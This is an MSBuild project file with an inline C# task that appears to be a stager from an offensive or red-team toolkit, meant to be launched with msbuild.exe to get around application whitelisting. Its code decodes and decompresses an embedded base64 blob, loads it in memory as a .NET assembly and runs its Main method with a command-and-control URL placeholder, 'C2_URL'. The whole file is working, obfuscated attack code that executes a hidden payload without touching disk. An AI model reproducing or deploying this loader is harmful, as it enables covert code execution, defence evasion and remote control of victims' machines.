<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml -->
  <Target Name="Hello">
    <ST >
    </ST>
  </Target>
  <UsingTask
    TaskName="ST"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Reflection" />
      <Using Namespace="System.IO" />
      <Using Namespace="System.IO.Compression" />

      <Code Type="Fragment" Language="cs">
        <![CDATA[

        string url = "C2_URL";

        // ----- DO NOT EDIT BELOW HERE -----
        string b64 = "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";

        string[] args = new string[] { url };
        byte[] compressed = System.Convert.FromBase64String(b64);
        using (MemoryStream inputStream = new MemoryStream(compressed.Length))
        {
            inputStream.Write(compressed, 0, compressed.Length);
            inputStream.Seek(0, SeekOrigin.Begin);
            using (MemoryStream outputStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                    {
                        outputStream.Write(buffer, 0, bytesRead);
                    }
                }
              Assembly a = Assembly.Load(outputStream.ToArray());
              Type t = a.GetType("ST");
              object classInstance = Activator.CreateInstance(t, null);
              MethodInfo methodInfo = t.GetMethod("Main");
              methodInfo.Invoke(classInstance, new object[] { args });
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
